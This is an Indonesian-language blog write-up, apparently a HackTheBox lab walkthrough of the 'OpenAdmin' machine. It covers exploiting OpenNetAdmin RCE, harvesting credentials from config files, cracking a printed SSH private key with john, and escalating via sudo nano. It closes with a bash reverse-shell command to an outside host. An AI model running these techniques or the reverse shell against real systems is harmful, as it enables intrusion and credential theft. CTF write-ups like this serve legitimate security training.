@@ -1,0 +1,935 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HackTheBox Machine - OpenAdmin | Tri Wanda Septian’s Blog</title>
+<meta name="description" content="">
+
+
+  <meta name="author" content="Tri Wanda Septian">
+  
+  <meta property="article:author" content="Tri Wanda Septian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Tri Wanda Septian's Blog">
+<meta property="og:title" content="HackTheBox Machine - OpenAdmin">
+<meta property="og:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-openadmin/">
+
+
+  <meta property="og:description" content="">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-frame.png">
+
+
+
+  <meta name="twitter:site" content="@twseptian_">
+  <meta name="twitter:title" content="HackTheBox Machine - OpenAdmin">
+  <meta name="twitter:description" content="">
+  <meta name="twitter:url" content="http://localhost:4000/hackthebox%20machine/htb-machine-openadmin/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/htb-frame.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2020-03-05T00:00:00+07:00">
+
+
+
+  <meta property="article:modified_time" content="2020-03-05T14:58:26+07:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/hackthebox%20machine/htb-machine-openadmin/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Tri Wanda Septian's Blog and Stuff",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />
+
+
+  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+    <!-- start custom head snippets -->
+<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Tri Wanda Septian
+          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">about me</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    
+    <aside class="sidebar__top">
+      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
+      </aside>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Machine - OpenAdmin">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2020-03-05T00:00:00+07:00">
+    <meta itemprop="dateModified" content="2020-03-05T14:58:26+07:00">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">HackTheBox Machine - OpenAdmin
+</h1>
+          
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2020-03-05T00:00:00+07:00">March 5, 2020</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+
+          <section class="page__share">
+  
+    <!--<h4 class="page__share-title">Share on</h4>-->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=HackTheBox+Machine+-+OpenAdmin%20http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-openadmin%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-openadmin%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fhackthebox%2520machine%2Fhtb-machine-openadmin%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
+  
+  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
+</section>
+
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#scanning">Scanning</a></li>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#privilege-escalation---user-joanna">Privilege Escalation - USER (Joanna)</a></li>
+  <li><a href="#privilege-escalation---root">Privilege Escalation - ROOT</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p><img src="/assets/images/htb-machine-openadmin/featured-image.jpg" alt="HTB OpenAdmin" /></p>
+
+<h3 id="scanning">Scanning</h3>
+
+<p>Hal pertama yang dilakukan adalah scanning menggunakan nmap terhadap alamat ip <code class="language-plaintext highlighter-rouge">10.10.10.171</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/02.png" alt="02" /></p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>didapatkan open port antara lain port <code class="language-plaintext highlighter-rouge">22</code> dan port <code class="language-plaintext highlighter-rouge">80</code>. Untuk port <code class="language-plaintext highlighter-rouge">80</code> yaitu akses website dapat dicek menggunakan browser.</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/03.png" alt="03" /></p>
+
+<p>Namun, hanya tampilan <code class="language-plaintext highlighter-rouge">default</code> dari Apache2 server. Untuk itu dibutuhkan process enumerasi lebih lanjut terhadap akses alamat ip target tersebut, dengan menggunakan directory scanner, dalam hal ini saya gunakan <code class="language-plaintext highlighter-rouge">dirbuster</code> bawaan dari kali linux, dan dengan wordlist <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/04.png" alt="04" /></p>
+
+<p>saat proses <code class="language-plaintext highlighter-rouge">brute-forcing</code> terdapat beberapa direktori yang dapat di tangkap, seperti direktori <code class="language-plaintext highlighter-rouge">music</code> dan <code class="language-plaintext highlighter-rouge">ona</code>, kemudian dilakukan pengecekan satu-persatu. Dan yang paling menarik adalah pada direktori <code class="language-plaintext highlighter-rouge">ona</code> tersebut, yang dapat diakses melalui url <code class="language-plaintext highlighter-rouge">http://10.10.10.171/ona</code> dan ini merupakan sebuah <code class="language-plaintext highlighter-rouge">clue</code> yang sesuai dengan nama machine htb tersebut yaitu <code class="language-plaintext highlighter-rouge">OpenAdmin</code>.</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/05.png" alt="05" /></p>
+
+<p>Tidak perlu berlama lagi, proses bruteforcing tidak perlu dilanjutkan,dan langusung berfokus pada target <code class="language-plaintext highlighter-rouge">http://10.10.10.171/ona</code> yaitu sebuah website untuk monitoring sistem bernama <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code>.</p>
+
+<p>Selanjutnya beberapa hal yang perlu dilakukan antara lain adalah mencari informasi mengenai <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code>, bisa menggunakan <code class="language-plaintext highlighter-rouge">searchploit</code> ataupun browsing/googling dengan kata kunci <code class="language-plaintext highlighter-rouge">OpenNetAdmin exploit</code></p>
+
+<p>Berikut tampilan dari <code class="language-plaintext highlighter-rouge">searchploit</code>
+<img src="/assets/images/htb-machine-openadmin/06.png" alt="06" /></p>
+
+<p>Berikut tampilan dari website exploit-db <a href="https://www.exploit-db.com/exploits/47691">https://www.exploit-db.com/exploits/47691</a>
+<img src="/assets/images/htb-machine-openadmin/06-b.png" alt="06-b" /></p>
+
+<p>vuln yang digunakan adalah <code class="language-plaintext highlighter-rouge">OpenNetAdmin 18.1.1 - Remote Code Execution </code> kemudian lanjut dengan meng-copy script dari path <code class="language-plaintext highlighter-rouge">exploits/php/webapps/47691.sh</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/07.png" alt="07" /></p>
+
+<p><code class="language-plaintext highlighter-rouge">catatan</code>: gunakan command <code class="language-plaintext highlighter-rouge">dos2unix</code> pada file tersebut, agar kompatibel dengan sistem operasi linux/unix</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/08.png" alt="08" /></p>
+
+<p>Jalankan script tersebut dengan target <code class="language-plaintext highlighter-rouge">http://10.10.10.171/ona</code>, kemudian didapatkan akses terminal terhadap server opennetadmin tersebut, dan diarahkan ke akses <code class="language-plaintext highlighter-rouge">www-data</code>
+<img src="/assets/images/htb-machine-openadmin/09.png" alt="09" />
+<img src="/assets/images/htb-machine-openadmin/10.png" alt="10" /></p>
+
+<p>target enumerasi selanjutnya adalah file konfigurasi OpenNetAdmin tersebut yaitu pada direktori <code class="language-plaintext highlighter-rouge">/opt/ona/www/config/</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/11.png" alt="11" /></p>
+
+<p>terdapat informasi penting mengenai file konfigurasi database <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code> tersebut yaitu pada <code class="language-plaintext highlighter-rouge">/opt/ona/www/config/database_setting.inc.php</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/12.png" alt="12" /></p>
+
+<p>informasi yang didapatkan adalah berupa <code class="language-plaintext highlighter-rouge">db_login</code>,<code class="language-plaintext highlighter-rouge">db_passwd</code>
+<img src="/assets/images/htb-machine-openadmin/13.png" alt="13" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'db_type'</span> <span class="o">=&gt;</span> <span class="s1">'mysqli'</span><span class="p">,</span>
+<span class="s1">'db_host'</span> <span class="o">=&gt;</span> <span class="s1">'localhost'</span><span class="p">,</span>
+<span class="s1">'db_login'</span> <span class="o">=&gt;</span> <span class="s1">'ona_sys'</span><span class="p">,</span>
+<span class="s1">'db_passwd'</span> <span class="o">=&gt;</span> <span class="s1">'n1nj4W4rri0R!'</span><span class="p">,</span>
+<span class="s1">'db_database'</span> <span class="o">=&gt;</span> <span class="s1">'ona_default'</span><span class="p">,</span>
+<span class="s1">'db_debug'</span> <span class="o">=&gt;</span> <span class="kc">false</span><span class="p">,</span>
+<span class="err">$</span> 
+</code></pre></div></div>
+
+<p>Selanjutnya, menampilkan list user server <code class="language-plaintext highlighter-rouge">OpenNetAdmin</code> tersebut, yaitu <code class="language-plaintext highlighter-rouge">root</code>, <code class="language-plaintext highlighter-rouge">jimmy</code>, <code class="language-plaintext highlighter-rouge">joanna</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/14.png" alt="14" /></p>
+
+<p>Gunakan password yang didapatkan pada file <code class="language-plaintext highlighter-rouge">/opt/ona/www/config/database_setting.inc.php</code> yaitu <code class="language-plaintext highlighter-rouge">n1nj4W4rri0R!</code> untuk remote ssh, dalam hal ini merupakan password untuk user <code class="language-plaintext highlighter-rouge">jimmy</code>.</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/15.png" alt="15" /></p>
+
+<h3 id="privilege-escalation---user-joanna">Privilege Escalation - USER (Joanna)</h3>
+
+<p>Untuk tahap selanjutnya, masuk ke direktori <code class="language-plaintext highlighter-rouge">/var/www/</code> dimana terdapat path lain yaitu <code class="language-plaintext highlighter-rouge">html</code> <code class="language-plaintext highlighter-rouge">internal</code> dan <code class="language-plaintext highlighter-rouge">ona</code> dalam hal ini path/direktori <code class="language-plaintext highlighter-rouge">internal</code> memberikan informasi penting yaitu mengenai file <code class="language-plaintext highlighter-rouge">main.php</code> yang mana terdapat informasi mengenai eksekusi <code class="language-plaintext highlighter-rouge">shell_exec</code> ke file <code class="language-plaintext highlighter-rouge">id_rsa</code> punya joanna</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/16.png" alt="16" /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="nb">session_start</span><span class="p">();</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span> <span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]))</span> <span class="p">{</span> <span class="nb">header</span><span class="p">(</span><span class="s2">"Location: /index.php"</span><span class="p">);</span> <span class="p">};</span> 
+<span class="c1"># Open Admin Trusted</span>
+<span class="c1"># OpenAdmin</span>
+<span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s1">'cat /home/joanna/.ssh/id_rsa'</span><span class="p">);</span>
+<span class="k">echo</span> <span class="s2">"&lt;pre&gt;</span><span class="nv">$output</span><span class="s2">&lt;/pre&gt;"</span><span class="p">;</span>
+<span class="cp">?&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+<span class="nt">&lt;h3&gt;</span>Don't forget your "ninja" password<span class="nt">&lt;/h3&gt;</span>
+Click here to logout <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"logout.php"</span> <span class="na">tite = </span><span class="s">"Logout"</span><span class="nt">&gt;</span>Session
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Kemudian saya mencoba untuk mengakses file <code class="language-plaintext highlighter-rouge">main.php</code> tersebut secara local menggunakan <code class="language-plaintext highlighter-rouge">curl</code> dan didapatkan informasi seperti gambar berikut, yang artinya menampilkan <code class="language-plaintext highlighter-rouge">404 Not Found</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/17.png" alt="17" /></p>
+
+<p>beberapa hal yang memungkinkan adalah terdapat service jaringan yang berjalan pada background, hal tersebut dapat di cek dengan menggunakan <code class="language-plaintext highlighter-rouge">netstat</code> dan terdapat informasi yang berjalan secara localhost adalah pada port database <code class="language-plaintext highlighter-rouge">127.0.0.1:3306</code> dan service <code class="language-plaintext highlighter-rouge">127.0.0.1:52846</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/17-b.png" alt="17-b" /></p>
+
+<p>Okay, mari kita akses dengan cmd <code class="language-plaintext highlighter-rouge">curl http://localhost:52846/main.php</code>, maka menampilkan <code class="language-plaintext highlighter-rouge">cat</code> terdapat file <code class="language-plaintext highlighter-rouge">/home/joanna/.ssh/id_rsa</code> untuk <code class="language-plaintext highlighter-rouge">joanna</code>.</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/17-c.png" alt="17-c" /></p>
+
+<p>copy informasi certificate id_rsa tersebut, kemudian simpan untuk dilakukan bruteforce menggunakan john</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+
+</code></pre></div></div>
+
+<p>gunakan tool <code class="language-plaintext highlighter-rouge">ssl2john.py</code> dan <code class="language-plaintext highlighter-rouge">john</code> untuk melakukan bruteforce dan didapatkan password untuk joanna adalah <code class="language-plaintext highlighter-rouge">bloodninjas</code> -&gt; <code class="language-plaintext highlighter-rouge">joanna:bloodninjas</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/18.png" alt="18" /></p>
+
+<p>selanjutnya mari lakukan akses ssh untuk akun joanna tersebut, kemudian akses flag <code class="language-plaintext highlighter-rouge">user.txt</code> 
+<img src="/assets/images/htb-machine-openadmin/19.png" alt="19" /></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/19-b.png" alt="19-b" /></p>
+
+<h3 id="privilege-escalation---root">Privilege Escalation - ROOT</h3>
+
+<p>Disini saya mengunakan trik untuk membypass untuk melihat root.txt setelah mendapatkan akses untuk user <code class="language-plaintext highlighter-rouge">joanna</code>, gunakan command <code class="language-plaintext highlighter-rouge">sudo -l</code> untuk masuk ke akses <code class="language-plaintext highlighter-rouge">root</code>,di dapatkan informasi yaitu <code class="language-plaintext highlighter-rouge">/bin/nano /opt/priv</code></p>
+
+<p><img src="/assets/images/htb-machine-openadmin/20.png" alt="20" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>joanna@openadmin:~$ sudo -l
+Matching Defaults entries for joanna on openadmin:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User joanna may run the following commands on openadmin:
+    (ALL) NOPASSWD: /bin/nano /opt/priv
+joanna@openadmin:~$ 
+
+</code></pre></div></div>
+<p>berikut adalah trik untuk langsung mendapatkan flag <code class="language-plaintext highlighter-rouge">root.txt</code> eksekusi command <code class="language-plaintext highlighter-rouge">sudo nano /opt/priv</code>
+<img src="/assets/images/htb-machine-openadmin/21.png" alt="21" /></p>
+
+<p>kemudian akan diarahkan ke <code class="language-plaintext highlighter-rouge">nano</code> dan tekan <code class="language-plaintext highlighter-rouge">ctrl+r</code> untuk <code class="language-plaintext highlighter-rouge">read file</code>, untuk step ini saya langsung ke path <code class="language-plaintext highlighter-rouge">/root/root.txt</code> :D kemudian tekan <code class="language-plaintext highlighter-rouge">Enter</code> dan ternyata dapat di akses</p>
+
+<p><img src="/assets/images/htb-machine-openadmin/22.png" alt="22" /></p>
+
+<p><strong>Tambahan:</strong> untuk previllege escalation root, pada <code class="language-plaintext highlighter-rouge">sudo nano /opt/priv</code> input cli reverse shell menggunakan bash cli <code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/10.10.14.21/4444 0&gt;&amp;1</code> kemudian dari sisi komputer host <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code></p>
+
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+  
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#hackthebox-machine" class="page__taxonomy-item" rel="tag">HackTheBox Machine</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-03-05">March 5, 2020</time></p>
+
+
+      </footer>
+      
+      
+  <nav class="pagination">
+    
+      <a href="/information%20security/malware%20analysis/check-pe-file-with-virustotal-api/" class="pagination--pager" title="How to use Virus Total API for check PE file
+">Previous</a>
+    
+    
+      <a href="/tryhackme/thm-nmap/" class="pagination--pager" title="TryHackMe - Nmap
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
